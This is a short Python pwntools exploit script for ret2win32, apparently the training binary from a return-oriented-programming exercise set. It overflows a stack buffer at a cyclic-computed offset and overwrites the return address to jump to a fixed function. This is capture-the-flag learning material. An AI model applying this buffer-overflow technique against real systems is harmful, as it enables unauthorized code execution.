#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386',terminal=['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'])
exe = './ret2win32'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
b *0x0804862b
b *0x80485ad
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
print(io.recv(1028).decode()+"\n")

offset=cyclic_find(0x6161616c)
eip=p32(0x804862c)
print(offset)
payload=(
    b"A"*offset+
    eip
)
print(payload)
io.sendline(payload)

io.interactive()

